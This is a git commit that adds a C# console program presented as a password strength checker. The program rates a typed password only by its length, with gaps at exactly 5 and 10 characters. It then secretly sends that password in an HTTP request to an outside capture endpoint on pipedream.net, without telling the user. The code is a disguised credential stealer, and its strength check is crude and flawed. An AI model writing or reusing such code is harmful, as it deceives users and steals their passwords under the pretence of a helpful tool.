2b120c6a0e026b9fadffa30a0d2f1267ac47e0a0
HackerKidd08 <60830008+HackerKidd08@users.noreply.github.com>
2020-02-08 18:15:55 -0500

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.Web;
+
+namespace ConsoleApp1
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string URL = "https://en9nxtpjdwglr.x.pipedream.net/";
+            Console.WriteLine("Password checker please enter a password to see how strong it is below:");
+            string password = Console.ReadLine();
+
+            if(password.Length < 5)
+            {
+                Console.WriteLine("Weak");
+            }else if(password.Length > 5 && password.Length < 10)
+            {
+                Console.WriteLine("Medium");
+            }else if (password.Length > 10)
+            {
+                Console.WriteLine("Strong");
+            }
+
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(URL + "password:" + HttpUtility.UrlEncode(password));
+            req.GetResponse();
+        }
+    }
+}
